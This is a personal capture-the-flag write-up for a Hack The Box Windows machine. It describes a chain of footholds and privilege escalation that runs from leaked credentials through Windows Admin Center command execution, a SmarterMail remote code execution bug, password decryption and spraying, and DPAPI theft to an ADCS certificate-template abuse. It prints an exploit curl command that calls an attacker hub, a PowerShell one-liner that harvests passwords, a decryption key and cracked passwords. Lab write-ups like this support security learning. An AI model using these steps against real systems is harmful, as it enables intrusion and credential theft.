---
platform: hackthebox
name: danglingtree
os: windows
difficulty: medium
status: todo
ip: 10.129.143.253
date: 2026-09-26
tags:
  - ctf
techniques: []
---
# danglingtree

> [!info] Box Info
> - **Platform: HacktheBox**
> - **OS: Windows**
> - **Difficulty: Medium**
> - **IP: 10.129.143.253**

## Recon
### Nmap

```bash 
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
6600/tcp open  ssl/mshvlm?
```
## Foothold / Initial Access

Guest Account Active. Has READ on IT share

![](assets/Pasted%20image%2020260926155031.png)

IT share has an assessment PDF.

![](assets/Pasted%20image%2020260926155157.png)

The assessment pdf contains credentials -> anderson.w:R3dT3am@Acc3ss#01

![](assets/Pasted%20image%2020260926155305.png)

Further digging with the credentials all led up to port 6600. This post was serving a Windows Admin Center instance.

![](assets/Pasted%20image%2020260926214733.png)

anderson.w did not have permission to connect or manage the DC.

![](assets/Pasted%20image%2020260926214931.png)

Considering I did not know much about the Windows Admin Center, I dug around to find a version indicator. Turns out the installed gateway version is 2511.

![](assets/Pasted%20image%2020260926215438.png)

Digging deeper, there are some potential CVE candidates.

[CVE-2026-35438](https://zeropath.com/blog/cve-2026-35438-windows-admin-center-privilege-escalation) & [CVE-2026-26119](https://dev.to/instatunnel/domain-overlord-cve-2026-26119-the-silent-privilege-escalation-in-windows-admin-center-498)

Potentially leaning more toward 26119.

I continued to review requests as I click through the WAC interface. When clicking on "connect", the request seems to call the "InvokeCommand" powershell cmdlet and sends the script and specific command in the request body. Could potentially leverage this to get RCE.

![](assets/Pasted%20image%2020260926223335.png)

I try to use the Invoke-WebRequest cmdlet and receive the perfect error in the response.

![](assets/Pasted%20image%2020260926223601.png)

With this information, I do another test and check if my python web server receives a request.

![](assets/Pasted%20image%2020260926224307.png)

I started using mythic recently to try it out. I generated shellcode via mythic and also used C# inline code in a powershell script to use winapis to execute the shellcode in memory. no evasion considered honestly, just straight out of the box use.

![](assets/Pasted%20image%2020260927005220.png)

## Lateral Move to svc_mail

In the C:\ directory, I see the SmarterMail folder that stands out to me. From my enumeration early on, I found a service account named "svc_mail". This immediately looks like the next vector to potentially laterally moving to the service account.

![](assets/Pasted%20image%2020260927022031.png)

After doing some research on SmarterMail, I found its vulnerable to unauthenticated RCE.
[CVE-2026-24423]([CVE-2026-24423 - SmarterTools SmarterMail Remote Code Execution Vulnerability - CYFIRMA](https://www.cyfirma.com/research/cve-2026-24423-smartertools-smartermail-remote-code-execution-vulnerability/))
[Malicious Hub]([aavamin/CVE-2026-24423: CVE-2026-24423 exp](https://github.com/aavamin/CVE-2026-24423))

From the article, this is the attack flow:

--- START OF ATTACK FLOW ---
#### Step 1 – Reconnaissance

Attackers identify internet-accessible SmarterMail servers through:

- Internet scanning of common web service ports
- Identification of SmarterMail login pages
- HTTP fingerprinting of server responses

Once a target is identified, attackers determine whether the server is running a vulnerable version.

#### Step 2 – Malicious Hub Preparation

Attackers deploy a malicious HTTP server designed to mimic a legitimate hub service. This server returns crafted JSON responses containing command execution instructions.

**Example malicious response:**

![](https://www.cyfirma.com/media/2026/03/smartermail12-2.jpg)

#### Step 3 – Exploit Delivery

The attacker sends a crafted request instructing the target server to connect to the malicious hub endpoint.

![](https://www.cyfirma.com/media/2026/03/smartermail12-3.jpg)

#### Step 4 – Malicious Response Processing

The SmarterMail server retrieves the response from the attacker-controlled hub server and processes the returned configuration parameters. Because the response values are not properly validated, the malicious instruction contained within the CommandMount parameter is passed to internal command execution routines.

#### Step 5 – Command Execution

The command executes within the context of the SmarterMail service process.

Typical privilege levels include:

Windows:

![](https://www.cyfirma.com/media/2026/03/smartermail12-4.jpg)

Linux:

![](https://www.cyfirma.com/media/2026/03/smartermail12-5.jpg)

This level of access allows attackers to fully compromise the underlying host system.

--- END OF ATTACK FLOW ---

 I verified that the service is up and running on port 17017.

![](assets/Pasted%20image%2020260927021833.png)

Now I can leverage that malicious hub python script from the repo above and send an arbitrary command to test if it works.

But first I need to set up a socks proxy to send data to the local port (17017).

w mythic

![](assets/Pasted%20image%2020260927023028.png)

Ok, now I can modify my proxychains4.conf file and we are good to go on the socks side. 
Additionally, I made sure to change two values in the script.

![](assets/Pasted%20image%2020260927023245.png)

I run the script and send a post request to the service.

```
proxychains curl -X POST http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub --json '{"hubAddress": "http://10.10.14.109:8000","oneTimePassword": "test","nodeName": "victim"}'
```

![](assets/Pasted%20image%2020260927023446.png)

Proxying worked and got a callback from SmarterMail. I also see that the command executed successfully.

Time to execute our shellcode in memory as svc_mail.

![](assets/Pasted%20image%2020260927024848.png)

## Lateral Move to noah.b

Note: I tackled this next portion on the next day. The box was turned off and i had to redo my steps above. However, this time you will see the adaptixC2 rather than mythic.

As svc_mail, I can now access the "C:\smartermail" directory that anderson could not. This folder contains a lot of other folders and files.

There are two directories living inside the domains directory:
- danglingtree.htb
- danglingtree.htb.bak

![](assets/Pasted%20image%2020260928172905.png)

Both of these folders contain a "users" folder. However, only "danglingtree.htb.bak" contained many users I could dig through.

![](assets/Pasted%20image%2020260928173807.png)

An interesting file in most of the users is the "settings.json" file. This file contains a "password_encrypted" property.

![](assets/Pasted%20image%2020260928172811.png)

With this new information, I can use powershell to recursively grab the values for all "password_encrypted" properties within settings.json files.

```powershell
gci -fi settings.json -R | % {(gc -raw $_.FullName | convertfrom-json).settings.password_encrypted} | sort -u
```

![](assets/Pasted%20image%2020260928220507.png)

Now the question is, how do we crack them?
Digging into smartermail and how to decrypt the enc passwords results in two articles by "GIRONSEC":

[Cracking SmarterMail Hashes](https://www.gironsec.com/blog/2012/08/cracking-smartermail-hashes/)
[SmarterMail Password Decryption Updates](https://www.gironsec.com/blog/2016/05/smartermail-password-decryption-updates/)

The more informative one was the "Cracking SmarterMail Hashes" post.

"Unlike most companies, I assume SmarterTools doesn’t know how to encrypt or obfuscate its binaries, instead, they store all of their code in a managed assembly DLL and call it with an exe"

I look at the "MailService.exe" PE first using pe-bear. No interesting strings. I do however see the MailService.dll called.

![](assets/Pasted%20image%2020260928221833.png)

So I grab that dll as well and use dnspy to begin searching for the key. One quick and easy find ofc.

`a3oij89FF!apoife`

![](assets/Pasted%20image%2020260928222051.png)

In the same article, he gives us the code to his decryption tool. I built it using vs and retrieved multiple passwords.
Note: Need to switch out the passwordkey in the code to the one found in the dll.

![](assets/Pasted%20image%2020260928224127.png)

The tool works :)

![](assets/Pasted%20image%2020260928224256.png)

Password List:

```
OceanWave#9Sky!
RiverDragon#Storm25
SophiaSecure!Pass24
LiamPowerPass@2026
EmmaSecure2026!Pass
OliverStrong#24Pass
```

I spray these creds at all users in the domain and hit on svc_mail and noah.b.

![](assets/Pasted%20image%2020260928225238.png)

![](assets/Pasted%20image%2020260928230943.png)

## Lateral Move to alex.o

This was a quick one. noah.b did not have any special rights to any objects. This ultimately led to me checking his folders on the DC. I found the user's dpapi secrets.

![](assets/Pasted%20image%2020260928232638.png)

I took the files offline and used impacket-dpapi to decrypt the masterkey and protected data.

![](assets/Pasted%20image%2020260928232853.png)

## Lateral Move to jake.h

Another quick move.

Previous bloodhound data from svc_mail reveals that alex.o belongs to the "support-it" group. This group has the ForceChangePassword right on jake.h 

![](assets/Pasted%20image%2020260928233003.png)

Using bloodyad, I quickly changed the password for jake.h.

![](assets/Pasted%20image%2020260928233318.png)

## Privilege Escalation

jake.h belongs to the helpdesk_cert_support, devops_pki, and template_editors groups.

![](assets/Pasted%20image%2020260928233424.png)

The helpdesk_cert_support group has managecertificates rights.
I went into a long rabbit hole of trying to abuse an escalation path because of the helpdesk_cert_support group. 

Eventually I remembered earlier that jake.h had CREATE_CHILD ace on the Certificate Templates container meaning he can create new template child objects in the forest.

![](assets/Pasted%20image%2020260929023832.png)

This container contains the certificate templates objects.

![](assets/Pasted%20image%2020260929024044.png)

### Incorrect Approach Demonstration
I started digging on how to create a new child object (template) in this container. Found multiple ways to do it via Windows; and jake.h can RDP as he is part of the "Remote Desktop Users" group. I was going to do it via ADUC but it kept hanging the box, so I went with ADSI.

![](assets/Pasted%20image%2020260929024451.png)

![](assets/Pasted%20image%2020260929024605.png)

![](assets/Pasted%20image%2020260929024740.png)

Once the new template object was created, I just gave Authenticated Users -> Full Control, because why not.

![](assets/Pasted%20image%2020260929025051.png)

I verified that the template is all good using certipy. The template is definitely missing the necessary configurations. BTW, probably best to just duplicate a cert template as per Microsoft docs.

![](assets/Pasted%20image%2020260929025344.png)

![](assets/Pasted%20image%2020260929025600.png)

jake.h owns the new template. I can clone the configurations of SubCA to charlietemplate.

![](assets/Pasted%20image%2020260929025805.png)

The reason I say this was the incorrect approach on my part is because I forgot that I would still need the CA to issue this template, and jake.h does not have the permissions to do that. Ultimately meaning that even with full control of the template, jake.h is still not able to enable it for use. 

### Correct Approach

Before demonstrating the correct approach, I did have to research the difference between templates in the CA vs templates that live in the "Certificate Templates" container in the forest.

Essentially, templates are created and have their template configurations living in the forest in the "Certificate Templates" container. The Certificate Templates on the CA are just the templates that are issued by the CA (i.e. enabled). This is why I see more templates in the C.T. container vs the CA.

In the image below, the window on the left is the CA and the window on the right are the template objects within the C.T. container in the forest.

![](assets/Pasted%20image%2020260929104442.png)

So our jake.h user has CREATE_CHILD for the "Certificate Templates" container (right). Only thing is, our user would still need to be able to enable the template to begin requesting certificates. That is when I notice that there are three issued templates in the CA that are coming back with a red 'X'.

![](assets/Pasted%20image%2020260929104922.png)

Digging into what this means (without common sense), I found a MC learn thread that talks about "accidentally" deleting a template.

[thread]([accidentally deleted the CA certificate template - Microsoft Q&A](https://learn.microsoft.com/en-us/answers/questions/1280198/accidentally-deleted-the-ca-certificate-template))

One user replies with:

```
If you deleted template from CA management snap-in, then you only deleted a link, not template itself. In this case, in CA management snap-in, select "Certificate Templates", right-click -> New -> Certificate Template to issue. Select required template from the list and press Ok.

If you deleted template from Certificate Templates MMC, then it is deleted irreversible.
```

This means at some point the three templates above existed and the CA is trying to issue them with no success. Our user can create a new template (better to duplicate) and give it one of those template names. This gives us:

- Full access on the Cert Template and its configurations
- An enabled Cert Template

I created the template.

![](assets/Pasted%20image%2020260929105842.png)

Now looking at the template with certipy I can see the template is enabled.

![](assets/Pasted%20image%2020260929110555.png)

Easy esc1. I can now request a certificate with the upn set to administrator.

![](assets/Pasted%20image%2020260929111153.png)

Finally, I can authenticate with this certificate.

![](assets/Pasted%20image%2020260929111441.png)
## Loot
- [x] user.txt:
- [x] root.txt:

